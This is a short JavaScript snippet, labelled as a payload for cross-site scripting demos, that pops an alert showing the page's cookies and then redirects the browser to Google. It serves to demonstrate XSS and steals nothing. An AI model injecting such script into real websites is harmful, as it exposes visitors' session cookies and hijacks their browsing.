# simple javascript to include in xss demos
alert("This is XSS. Trying to display your cookies and redirect you to Google: " + document.cookie);
document.location.href="https://www.google.com";
